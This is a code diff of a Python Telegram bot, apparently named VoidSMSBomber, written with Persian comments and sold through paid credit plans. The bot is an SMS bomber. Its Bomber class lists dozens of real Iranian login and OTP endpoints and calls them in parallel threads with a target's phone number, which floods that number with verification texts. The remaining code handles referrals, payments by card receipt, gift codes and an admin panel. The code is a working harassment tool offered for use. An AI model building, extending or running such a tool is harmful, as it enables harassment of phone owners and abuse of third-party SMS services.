@@ -2,13 +2,12 @@ import random
 import threading
 import time
 import requests
+import phonenumbers
 import os
-import sqlite3
+import json
 import telebot
 from telebot import types
 from flask import Flask
-from datetime import datetime
-import traceback
 
 # ==========================================
 # 1. وب‌سرور برای سلامت پورت (Render)
@@ -16,94 +15,60 @@ import traceback
 app = Flask(__name__)
 @app.route('/')
 def health(): return "Bot is running!", 200
+def run_web():
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port, use_reloader=False)
+threading.Thread(target=run_web, daemon=True).start()
 
 # ==========================================
 # 2. تنظیمات و دیتابیس
 # ==========================================
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 ADMIN_ID = 6914309071
-CARD_NUMBER = "" # ⚠️ شماره کارت خودت را اینجا بگذار
-DB_FILE = "bot_database.db"
+CARD_NUMBER = "[شماره_کارت_اینجا]" 
+DB_FILE = "users_db.json"
 bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 
-bot.set_my_commands([
-    types.BotCommand("start", "شروع ربات"),
-    types.BotCommand("admin", "پنل مدیریت"),
-    types.BotCommand("help", "راهنما")
-])
+def load_db():
+    if os.path.exists(DB_FILE):
+        try:
+            with open(DB_FILE, "r") as f: return json.load(f)
+        except: return {}
+    return {}
 
-PANEL_IMAGE_URL = "https://i.imgur.com/Z7lvgzO.jpeg"
-VIP_COST = 1000
-WHEEL_COOLDOWN = 86400
+def save_db(db):
+    with open(DB_FILE, "w") as f: json.dump(db, f)
 
-# ⚠️ نام کانال‌های خود را وارد کنید
-CHANNEL_1 = "@BloodBomber_Chanel"
-CHANNEL_2 = "@YourChannel2"
-
-SERVICE_CONFIG = {
-    "free":  {"name": "رایگان", "max_phones": 2,  "delay": 1.0, "max_daily": 3},
-    "basic": {"name": "پایه",   "max_phones": 3,  "delay": 0.5, "max_daily": 999},
-    "pro":   {"name": "حرفه‌ای","max_phones": 5,  "delay": 0.3, "max_daily": 999},
-    "vip":   {"name": "ویژه (VIP)", "max_phones": 10, "delay": 0.1, "max_daily": 999}
-}
+user_states = {}       
+pending_approvals = {} 
+active_bombers = {}    
+active_gift_codes = {} 
 
 PLANS = {
-    "basic": {"name": "پایه (۱۰۰ اعتبار)", "price": 150, "credits": 100},
-    "pro": {"name": "حرفه‌ای (۵۰۰ اعتبار)", "price": 450, "credits": 500},
-    "vip": {"name": "ویژه (۱۲۰۰ اعتبار)", "price": 600, "credits": 1200}
+    "basic": {"name": "پایه (Basic)", "price": 150, "uses": 10},
+    "pro": {"name": "حرفه‌ای (Pro)", "price": 450, "uses": 50},
+    "vip": {"name": "ویژه (VIP)", "price": 600, "uses": 9999}
 }
 
-def init_db():
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS users (
-        user_id TEXT PRIMARY KEY, name TEXT, plan TEXT, credits INTEGER, 
-        last_daily REAL, sub_expiry REAL, daily_bomb_count INTEGER, last_bomb_date TEXT,
-        total_purchases INTEGER DEFAULT 0, invites INTEGER DEFAULT 0,
-        last_wheel_spin REAL DEFAULT 0)''')
-    conn.commit()
-    conn.close()
-init_db()
-
-def get_user(user_id):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
-    row = c.fetchone()
-    conn.close()
-    if row: return {"user_id": row[0], "name": row[1], "plan": row[2], "credits": row[3], "last_daily": row[4], "sub_expiry": row[5], "daily_bomb_count": row[6], "last_bomb_date": row[7], "total_purchases": row[8], "invites": row[9], "last_wheel_spin": row[10]}
-    return None
-
-def save_user(user_id, name, plan, credits, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases=0, invites=0, last_wheel_spin=0):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", 
-              (user_id, name, plan, credits, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases, invites, last_wheel_spin))
-    conn.commit()
-    conn.close()
-
-user_states, pending_approvals, active_bombers, active_gift_codes = {}, {}, {}, {}
-
 # ==========================================
-# 3. هسته بمبر (اصلاح‌شده نهایی)
+# 3. هسته بمبر (Bomber Core)
 # ==========================================
 class Bomber:
-    def __init__(self, phone_numbers, user_id, plan):
-        self.phone_numbers = phone_numbers.split(",") if "," in phone_numbers else [phone_numbers]
+    def __init__(self, phone_number, user_id):
+        self.phone_number = phone_number
         self.user_id = user_id
-        self.plan = plan
         self.services = []
         self.load_services()
         self.session = requests.Session()
         self.stop_event = threading.Event()
         self.success = 0
         self.fail = 0
-        self.total_services = len(self.services) * len(self.phone_numbers)
 
     def load_services(self):
-        # ⚠️⚠️⚠️ لیست سرویس‌های خودت رو دقیقاً اینجا کپی کن ⚠️⚠️⚠️
+        # ⚠️⚠️⚠️ لیست کامل سرویس‌های خودت رو دقیقاً اینجا کپی کن ⚠️⚠️⚠️
         self.services = [
-            # {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
+              {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
+              {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
               {'name': 'Limoome', 'url': 'https://my.limoome.com/api/auth/login/otp', 'method': 'POST', 'data': lambda: {"mobileNumber": self.phone_number.split("+98")[1], "country": "1"}, 'json': False},
               {'name': 'Jabama', 'url': 'https://taraazws.jabama.com/api/v4/account/send-code', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number}, 'json': True},
               {'name': 'SimKhan First', 'url': 'https://www.simkhanapi.ir/api/users/registerV2', 'method': 'POST', 'data': lambda: {"mobileNumber": "0" + self.phone_number.split("+98")[1], "ReSendSMS": False}, 'json': True},
@@ -195,348 +160,219 @@ class Bomber:
               {'name': 'Myroz', 'url': 'https://myroz.ir/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "stm_login_register", "type": "mobile", "input": "0" + self.phone_number.split("+98")[1]}, 'json': False},
               {'name': 'Sunnybook', 'url': 'https://sunnybook.ir/Home/RegisterUser', 'method': 'POST', 'data': lambda: {"name": "Mr", "password": "123456", "mobile": self.phone_number.split("+98")[1]}, 'json': True},
               {'name': 'Adinehbook', 'url': 'https://www.adinehbook.com/gp/flex/sign-in.html', 'method': 'POST', 'data': lambda: {"action": "sign", "phone_cell_or_email": "0" + self.phone_number.split("+98")[1]}, 'json': False},
-        ]
+         ]
 
-    def send_request(self, service, phone):
+    def send_request(self, service):
         if self.stop_event.is_set(): return
-        
-        self.phone_number = phone
-        
         try:
-            try:
-                data = service['data'](phone)
-            except TypeError:
-                data = service['data']()
-                
-            if isinstance(data, dict):
-                for key in ['phone', 'mobile', 'mobileNumber', 'cellphone', 'username', 'cell', 'mobileNo', 'phoneNumber']:
-                    if key in data: data[key] = phone
-
-            headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+            data = service['data']()
+            headers = {'User-Agent': "Mozilla/5.0"}
             method = service['method'].upper()
             use_json = service.get('json', False)
-            
+
             if method == 'POST':
                 if use_json: resp = self.session.post(service['url'], json=data, headers=headers, timeout=5)
                 else: resp = self.session.post(service['url'], data=data, headers=headers, timeout=5)
             else:
                 resp = self.session.get(service['url'], params=data, headers=headers, timeout=5)
-                
+
             if resp.status_code in (200, 201, 202, 204): self.success += 1
             else: self.fail += 1
-        except Exception:
+        except:
             self.fail += 1
 
-    def worker(self, subset, phone):
+    def worker(self, subset):
         for service in subset:
             if self.stop_event.is_set(): break
-            self.send_request(service, phone)
-            time.sleep(SERVICE_CONFIG.get(self.plan, SERVICE_CONFIG["free"])["delay"])
+            self.send_request(service)
+            time.sleep(0.3)
 
     def start(self):
         if not self.services:
-            bot.send_message(self.user_id, "لیست سرویس‌ها خالی است.")
+            bot.send_message(self.user_id, "❌ خطا: لیست سرویس‌ها خالی است.")
             return
             
-        self.success, self.fail = 0, 0
-        chunk_size = max(1, len(self.services) // 15)
+        self.success = 0
+        self.fail = 0
+        total = len(self.services)
+        chunk_size = max(1, total // 15)
+        chunks = [self.services[i:i + chunk_size] for i in range(0, total, chunk_size)]
+        
         threads = []
-        
-        status_msg = bot.send_message(self.user_id, f"⏳ **در حال ارسال...**\nمیزان پیشرفت: 0/{self.total_services}", parse_mode='Markdown')
-        
-        for phone in self.phone_numbers:
-            if not phone.startswith("+"): phone = "+98" + phone.lstrip("0")
-            chunks = [self.services[i:i + chunk_size] for i in range(0, len(self.services), chunk_size)]
-            for chunk in chunks:
-                t = threading.Thread(target=self.worker, args=(chunk, phone))
-                t.start()
-                threads.append(t)
-                
-        def update_status():
-            last_update = time.time()
-            while any(t.is_alive() for t in threads):
-                if time.time() - last_update > 2:
-                    done = self.success + self.fail
-                    percent = int((done / self.total_services) * 100) if self.total_services > 0 else 0
-                    bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
-                    try:
-                        bot.edit_message_text(
-                            f"⏳ **در حال ارسال...**\n\n"
-                            f"✅ موفق: {self.success}\n"
-                            f"❌ ناموفق: {self.fail}\n\n"
-                            f"📊 [{bar}] {percent}%\n"
-                            f"میزان پیشرفت: {done}/{self.total_services}",
-                            self.user_id, status_msg.message_id, parse_mode='Markdown'
-                        )
-                    except: pass
-                    last_update = time.time()
-                time.sleep(0.5)
-                
+        for chunk in chunks:
+            t = threading.Thread(target=self.worker, args=(chunk,))
+            t.start()
+            threads.append(t)
+            
         for t in threads: t.join()
-        update_status()
         
-        percent = int((self.success / self.total_services) * 100) if self.total_services > 0 else 0
-        bot.edit_message_text(
-            f"🏁 **گزارش نهایی:**\n\n"
-            f"✅ موفق: {self.success}\n"
-            f"❌ ناموفق: {self.fail}\n"
-            f"📊 درصد موفقیت: {percent}%",
-            self.user_id, status_msg.message_id, parse_mode='Markdown'
+        percent = int((self.success / total) * 100) if total > 0 else 0
+        report = (
+            f"🏁 **گزارش عملیات**\n\n"
+            f"📞 هدف: `{self.phone_number}`\n"
+            f"✅ موفق: **{self.success}**\n"
+            f"❌ ناموفق: **{self.fail}**\n"
+            f"📊 درصد موفقیت: **{percent}%**"
         )
+        bot.send_message(self.user_id, report, parse_mode='Markdown')
         if self.user_id in active_bombers: del active_bombers[self.user_id]
 
 # ==========================================
-# 4. منوهای شیشه‌ای (Inline)
+# 4. منوها و دکمه‌ها
 # ==========================================
-def get_main_menu():
+def main_menu():
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
-        types.InlineKeyboardButton("🆓 اجرای رایگان", callback_data="menu_bomb_free"),
-        types.InlineKeyboardButton("💎 اجرای اشتراکی", callback_data="menu_bomb_sub")
+        types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="menu_bomb"),
+        types.InlineKeyboardButton("🛒 خرید پلن", callback_data="menu_buy"),
+        types.InlineKeyboardButton("🎁 جایزه روزانه", callback_data="menu_daily"),
+        types.InlineKeyboardButton("👥 زیرمجموعه‌گیری", callback_data="menu_referral"),
+        types.InlineKeyboardButton("🔑 کد هدیه", callback_data="menu_gift"),
+        types.InlineKeyboardButton("🏆 برترین‌ها", callback_data="menu_leaderboard"),
+        types.InlineKeyboardButton("📋 پروفایل من", callback_data="menu_profile"),
+        types.InlineKeyboardButton("🎧 پشتیبانی", callback_data="menu_support")
     )
-    markup.add(
-        types.InlineKeyboardButton("💳 خرید اعتبار", callback_data="menu_buy"),
-        types.InlineKeyboardButton("📋 حساب کاربری", callback_data="menu_profile")
-    )
-    markup.add(
-        types.InlineKeyboardButton("🎰 گردونه شانس", callback_data="menu_wheel"),
-        types.InlineKeyboardButton("🎁 جایزه روزانه", callback_data="menu_daily")
-    )
-    markup.add(
-        types.InlineKeyboardButton("🤖 هوش مصنوعی", callback_data="menu_ai"),
-        types.InlineKeyboardButton("🏆 برترین‌ها", callback_data="menu_leaderboard")
-    )
-    markup.add(types.InlineKeyboardButton("🎧 پشتیبانی", callback_data="menu_support"))
-    markup.add(types.InlineKeyboardButton("🔑 کد هدیه", callback_data="menu_gift"))
     return markup
-
-# ==========================================
-# 5. بررسی جوین اجباری
-# ==========================================
-def is_user_joined(user_id):
-    try:
-        member_1 = bot.get_chat_member(CHANNEL_1, user_id)
-        if member_1.status not in ['member', 'administrator', 'creator']: return False
-        if CHANNEL_2 and CHANNEL_2 != "@YourChannel2":
-            member_2 = bot.get_chat_member(CHANNEL_2, user_id)
-            if member_2.status not in ['member', 'administrator', 'creator']: return False
-        return True
-    except:
-        return True
 
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     user_id = str(message.from_user.id)
+    db = load_db()
     
-    if not is_user_joined(user_id):
-        markup = types.InlineKeyboardMarkup(row_width=1)
-        markup.add(types.InlineKeyboardButton("📢 عضویت در کانال ۱", url=f"https://t.me/{CHANNEL_1.replace('@', '')}"))
-        if CHANNEL_2 and CHANNEL_2 != "@YourChannel2":
-            markup.add(types.InlineKeyboardButton("📢 عضویت در کانال ۲", url=f"https://t.me/{CHANNEL_2.replace('@', '')}"))
-        markup.add(types.InlineKeyboardButton("✅ عضو شدم", callback_data="check_join"))
-        bot.send_message(message.chat.id, "⚠️ **برای استفاده از ربات، ابتدا باید در کانال‌های ما عضو شوید!**", reply_markup=markup, parse_mode='Markdown')
-        return
-        
-    user = get_user(user_id)
-    
+    # سیستم زیرمجموعه
     args = message.text.split()
     if len(args) > 1 and args[1].startswith("ref_"):
         inviter_id = args[1].replace("ref_", "")
-        if inviter_id != user_id:
-            inviter = get_user(inviter_id)
-            if inviter:
-                inviter["invites"] += 1
-                inviter["credits"] += 5
-                save_user(**inviter)
-                try: bot.send_message(inviter_id, f"🎉 یک نفر با لینک شما وارد شد! ۵ اعتبار هدیه گرفتید.")
+        if inviter_id != user_id and inviter_id in db:
+            if user_id not in db:
+                db[inviter_id]["uses"] += 5
+                save_db(db)
+                try: bot.send_message(inviter_id, f"🎉 یک کاربر جدید با لینک شما وارد شد!\n💰 ۵ اعتبار اضافه شد.")
                 except: pass
 
-    if not user:
-        save_user(user_id, message.from_user.first_name, "free", 0, 0, 0, 0, "2000-01-01", 0, 0, 0)
+    if user_id not in db:
+        db[user_id] = {"plan": "none", "uses": 0, "name": message.from_user.first_name, "last_daily": 0}
+        save_db(db)
         
-    bot_info = bot.get_me()
-    user_mention = f"[{message.from_user.first_name}](tg://user?id={user_id})"
-    bot_mention = f"[Blood-Bomber](tg://user?id={bot_info.id})"
-    
-    caption = f"سلام {user_mention} عزیز! 👋\nبه ربات **{bot_mention}** خوش آمدید.\nاز منوی زیر استفاده کنید:"
-    
-    try:
-        bot.send_photo(message.chat.id, PANEL_IMAGE_URL, caption=caption, reply_markup=get_main_menu(), parse_mode='Markdown')
-    except:
-        bot.send_message(message.chat.id, caption, reply_markup=get_main_menu(), parse_mode='Markdown')
+    text = f"سلام {message.from_user.first_name}! 👋\nبه ربات **VoidSMSBomber** خوش آمدید."
+    bot.send_message(message.chat.id, text, reply_markup=main_menu(), parse_mode='Markdown')
 
-# ==========================================
-# 6. هندلرهای دکمه‌های شیشه‌ای (Callback Queries)
-# ==========================================
+@bot.message_handler(commands=['admin'])
+def cmd_admin(message):
+    if message.from_user.id != ADMIN_ID: return
+    
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton("📊 آمار کل", callback_data="admin_stats"),
+        types.InlineKeyboardButton("📢 پیام همگانی", callback_data="admin_broadcast"),
+        types.InlineKeyboardButton("🔑 مدیریت کدهای هدیه", callback_data="admin_gifts")
+    )
+    bot.reply_to(message, "👑 **پنل مدیریت**", reply_markup=markup, parse_mode='Markdown')
+
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callbacks(call):
     user_id = str(call.from_user.id)
-    user = get_user(user_id)
+    db = load_db()
     
-    if call.data == "check_join":
-        if is_user_joined(user_id):
-            bot.answer_callback_query(call.id, "✅ شما عضو شدید!", show_alert=True)
-            cmd_start(call.message)
-        else:
-            bot.answer_callback_query(call.id, "❌ شما هنوز عضو نشده‌اید!", show_alert=True)
-        return
-
     if call.data == "menu_back":
-        try:
-            bot.edit_message_media(types.InputMediaPhoto(PANEL_IMAGE_URL, caption="منوی اصلی:", parse_mode='Markdown'), call.message.chat.id, call.message.message_id, reply_markup=get_main_menu())
-        except:
-            bot.edit_message_text("منوی اصلی:", call.message.chat.id, call.message.message_id, reply_markup=get_main_menu(), parse_mode='Markdown')
-        return
+        bot.edit_message_text("منوی اصلی:", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+    
+    elif call.data == "menu_profile":
+        plan_name = PLANS[db[user_id]['plan']]['name'] if db[user_id]['plan'] in PLANS else "بدون پلن"
+        uses = db[user_id].get('uses', 0)
+        text = f"📋 **پروفایل:**\n\n👤 نام: {db[user_id].get('name')}\n💎 پلن: **{plan_name}**\n⚡️ اعتبار: **{uses}**"
+        
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("✏️ تغییر نام", callback_data="menu_change_name"))
+        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
-    if call.data == "menu_profile":
-        plan_name = PLANS.get(user['plan'], {}).get('name', "رایگان")
-        if user['plan'] == "free": plan_name = "🆓 رایگان"
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        text = (
-            f"👤 **نام:** {user['name']}\n"
-            f"🆔 **آیدی:** `{user_id}`\n"
-            f"📅 **تاریخ:** `{current_time}`\n"
-            f"👑 **نوع حساب:** **{plan_name}**\n"
-            f"💰 **اعتبار:** **{user['credits']}**\n"
-            f"👥 **دعوت‌ها:** **{user['invites']}**\n"
-        )
+    elif call.data == "menu_change_name":
+        user_states[user_id] = {"state": "waiting_for_name"}
+        bot.edit_message_text("✏️ لطفاً نام جدید خود را وارد کنید:", call.message.chat.id, call.message.message_id)
+
+    elif call.data == "menu_leaderboard":
+        sorted_users = sorted(db.items(), key=lambda item: item[1].get('uses', 0), reverse=True)[:5]
+        text = "🏆 **۵ کاربر برتر:**\n\n"
+        for i, (uid, data) in enumerate(sorted_users, 1):
+            text += f"{i}. {data.get('name', 'ناشناس')} ➜ {data.get('uses', 0)} اعتبار\n"
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
+    elif call.data == "menu_support":
+        user_states[user_id] = {"state": "waiting_for_support"}
+        bot.edit_message_text("🎧 لطفاً پیام خود را برای پشتیبانی بنویسید:", call.message.chat.id, call.message.message_id)
+
+    elif call.data == "menu_referral":
+        bot_username = bot.get_me().username
+        link = f"https://t.me/{bot_username}?start=ref_{user_id}"
+        text = f"👥 **زیرمجموعه‌گیری**\n\nهر نفر **۵ اعتبار**!\n\n🔗 لینک شما:\n`{link}`"
+        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+
+    elif call.data == "menu_daily":
+        now = time.time()
+        last_daily = db.get(user_id, {}).get("last_daily", 0)
+        
+        if now - last_daily < 86400:
+            remaining = 86400 - (now - last_daily)
+            bot.answer_callback_query(call.id, f"⏳ تا {int(remaining // 3600)} ساعت دیگر صبر کنید.", show_alert=True)
+        else:
+            db[user_id]["uses"] += 2
+            db[user_id]["last_daily"] = now
+            save_db(db)
+            bot.answer_callback_query(call.id, "🎉 ۲ اعتبار رایگان!", show_alert=True)
+
+    elif call.data == "menu_gift":
+        user_states[user_id] = {"state": "waiting_for_gift"}
+        bot.edit_message_text("🔑 کد هدیه را وارد کنید:", call.message.chat.id, call.message.message_id)
+
     elif call.data == "menu_buy":
-        text = "**پلن‌های اعتبار:**\n\n"
+        text = "🛒 **پلن‌ها:**\n\n"
         markup = types.InlineKeyboardMarkup(row_width=1)
         for key, plan in PLANS.items():
-            text += f"🔹 **{plan['name']}** | {plan['price']} تومان\n"
+            text += f"🔹 **{plan['name']}** | {plan['price']} تومان | {plan['uses']} استفاده\n"
             markup.add(types.InlineKeyboardButton(f"خرید {plan['name']}", callback_data=f"buy_{key}"))
         markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
     elif call.data.startswith("buy_"):
         plan_key = call.data.replace("buy_", "")
-        plan = PLANS[plan_key]
         user_states[user_id] = {"selected_plan": plan_key}
-        text = f"✅ پلن **{plan['name']}** انتخاب شد.\n\n💳 مبلغ **{plan['price']} تومان** را واریز کنید:\n`{CARD_NUMBER}`\n\n📸 سپس **عکس رسید** را بفرستید."
+        plan = PLANS[plan_key]
+        text = f"✅ **{plan['name']}** انتخاب شد.\n\n💳 مبلغ **{plan['price']} تومان**:\n`{CARD_NUMBER}`\n\n📸 عکس رسید را بفرستید."
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_buy"))
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
-    elif call.data == "menu_bomb_free":
-        user_states[user_id] = {"state": "waiting_for_phone", "service": "free"}
+    elif call.data == "menu_bomb":
+        if user_id in active_bombers:
+            bot.answer_callback_query(call.id, "⚠️ عملیات در حال اجراست!", show_alert=True)
+            return
+        if db.get(user_id, {}).get('uses', 0) <= 0:
+            bot.answer_callback_query(call.id, "❌ اعتبار ندارید!", show_alert=True)
+            return
+            
+        user_states[user_id] = {"state": "waiting_for_phone"}
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
-        bot.edit_message_text(f"📞 **سرویس رایگان**:\nشماره را وارد کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
-
-    elif call.data == "menu_bomb_sub":
-        markup = types.InlineKeyboardMarkup(row_width=1)
-        markup.add(
-            types.InlineKeyboardButton("💎 پایه (۳ شماره)", callback_data="sub_basic"),
-            types.InlineKeyboardButton("🔥 حرفه‌ای (۵ شماره)", callback_data="sub_pro"),
-            types.InlineKeyboardButton("👑 VIP (۱۰ شماره)", callback_data="sub_vip")
-        )
-        bot.edit_message_text("**نوع اشتراک خود را انتخاب کنید:**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
-
-    elif call.data.startswith("sub_"):
-        sub_type = call.data.replace("sub_", "")
-        user_states[user_id] = {"state": "waiting_for_phone", "service": sub_type}
-        max_phones = SERVICE_CONFIG[sub_type]["max_phones"]
-        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
-        bot.edit_message_text(f"📞 **سرویس {SERVICE_CONFIG[sub_type]['name']}** (حداکثر {max_phones} شماره):\nشماره را وارد کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
-
-    elif call.data == "menu_ai":
-        user_states[user_id] = {"state": "waiting_for_ai"}
-        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
-        bot.edit_message_text("🤖 **سلام! من دستیار هوش مصنوعی Blood-Bomber هستم.**\n\nسوال خود را درباره ربات بپرسید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
-
-    elif call.data == "menu_wheel":
-        if time.time() - user['last_wheel_spin'] < WHEEL_COOLDOWN:
-            bot.answer_callback_query(call.id, "⏳ امروز چرخانده‌اید!", show_alert=True)
-        else:
-            prize = random.choice([1, 2, 5, 10, 20, 50])
-            user['credits'] += prize
-            user['last_wheel_spin'] = time.time()
-            save_user(**user)
-            bot.answer_callback_query(call.id, f"🎉 {prize} اعتبار برنده شدید!", show_alert=True)
-
-    elif call.data == "menu_daily":
-        if time.time() - user['last_daily'] < 86400:
-            bot.answer_callback_query(call.id, "⏳ امروز گرفته‌اید!", show_alert=True)
-        else:
-            user['credits'] += 2
-            user['last_daily'] = time.time()
-            save_user(**user)
-            bot.answer_callback_query(call.id, "🎉 ۲ اعتبار رایگان!", show_alert=True)
-
-    elif call.data == "menu_leaderboard":
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute("SELECT name, credits FROM users ORDER BY credits DESC LIMIT 5")
-        rows = c.fetchall()
-        conn.close()
-        text = "**۵ کاربر برتر:**\n\n" + "".join([f"{i}. **{row[0]}** ➜ {row[1]} اعتبار\n" for i, row in enumerate(rows, 1)])
-        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
+        text = "📞 **شماره را وارد کنید:**\nمثال: `09123456789`"
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
-
-    elif call.data == "menu_support":
-        user_states[user_id] = {"state": "waiting_for_support"}
-        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
-        bot.edit_message_text("🎧 پیام خود را بنویسید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
-
-    elif call.data == "menu_gift":
-        user_states[user_id] = {"state": "waiting_for_gift"}
-        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
-        bot.edit_message_text("🔑 کد هدیه:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
     # ================= ادمین =================
     elif call.data == "admin_stats" and call.from_user.id == ADMIN_ID:
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute("SELECT COUNT(*) FROM users")
-        total_users = c.fetchone()[0]
-        c.execute("SELECT SUM(credits) FROM users")
-        total_credits = c.fetchone()[0] or 0
-        conn.close()
+        total_users = len(db)
+        total_credits = sum([u.get('uses', 0) for u in db.values()])
         bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, f"**آمار:**\n👥 کاربران: {total_users}\n💰 اعتبارها: {total_credits}", parse_mode='Markdown')
+        bot.send_message(call.message.chat.id, f"📊 **آمار:**\n👥 کاربران: {total_users}\n💰 اعتبارها: {total_credits}", parse_mode='Markdown')
 
-    elif call.data == "admin_list_users" and call.from_user.id == ADMIN_ID:
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute("SELECT user_id, name, plan, credits FROM users ORDER BY credits DESC")
-        users = c.fetchall()
-        conn.close()
-        if not users:
-            bot.send_message(call.message.chat.id, "هیچ کاربری یافت نشد.")
-            return
-        text = "👥 **لیست کاربران (۱۰ نفر برتر):**\n\n"
-        for u in users[:10]:
-            plan = PLANS.get(u[2], {}).get('name', "رایگان") if u[2] != 'free' else "رایگان"
-            text += f"👤 **{u[1]}** | آیدی: `{u[0]}` | پلن: {plan} | اعتبار: {u[3]}\n"
-        bot.send_message(call.message.chat.id, text, parse_mode='Markdown')
-
-    elif call.data == "admin_bulk_charge" and call.from_user.id == ADMIN_ID:
+    elif call.data == "admin_broadcast" and call.from_user.id == ADMIN_ID:
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(call.message.chat.id, "چند اعتبار به همه اضافه کنم؟ (عدد):")
-        bot.register_next_step_handler(msg, process_bulk_charge)
-
-    elif call.data == "admin_bulk_deduct" and call.from_user.id == ADMIN_ID:
-        bot.answer_callback_query(call.id)
-        msg = bot.send_message(call.message.chat.id, "چند اعتبار از همه کم کنم؟ (عدد):")
-        bot.register_next_step_handler(msg, process_bulk_deduct)
+        msg = bot.send_message(call.message.chat.id, "📝 متن پیام:")
+        bot.register_next_step_handler(msg, send_broadcast)
 
     elif call.data == "admin_gifts" and call.from_user.id == ADMIN_ID:
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(call.message.chat.id, "فرمت: `CODE CREDITS`:")
+        msg = bot.send_message(call.message.chat.id, "🔑 کد هدیه و تعداد را بفرستید (مثال: `WELCOME 10`):")
         bot.register_next_step_handler(msg, process_make_gift)
-
-    elif call.data == "admin_view_user" and call.from_user.id == ADMIN_ID:
-        bot.answer_callback_query(call.id)
-        msg = bot.send_message(call.message.chat.id, "آیدی عددی کاربر:")
-        bot.register_next_step_handler(msg, view_user_admin)
-
-    elif call.data == "admin_backup" and call.from_user.id == ADMIN_ID:
-        bot.answer_callback_query(call.id)
-        if os.path.exists(DB_FILE):
-            with open(DB_FILE, 'rb') as f:
-                bot.send_document(ADMIN_ID, f)
 
     elif call.data.startswith("admin_approve_"):
         req_id = call.data.replace("admin_approve_", "")
@@ -544,14 +380,11 @@ def handle_callbacks(call):
             data = pending_approvals[req_id]
             uid, plan_key = data["user_id"], data["plan"]
             plan = PLANS[plan_key]
-            user_data = get_user(uid)
-            if user_data:
-                user_data["credits"] += plan["credits"]
-                user_data["plan"] = plan_key
-                user_data["total_purchases"] += 1
-                save_user(**user_data)
-                bot.send_message(uid, f"**پرداخت تایید شد!**\n**{plan['credits']}** اعتبار اضافه شد.", parse_mode='Markdown')
+            db[uid]["plan"] = plan_key
+            db[uid]["uses"] += plan["uses"]
+            save_db(db)
             bot.edit_message_text(f"✅ تایید شد.", call.message.chat.id, call.message.message_id)
+            bot.send_message(uid, f"🎉 پلن **{plan['name']}** با **{plan['uses']}** استفاده فعال شد.", parse_mode='Markdown')
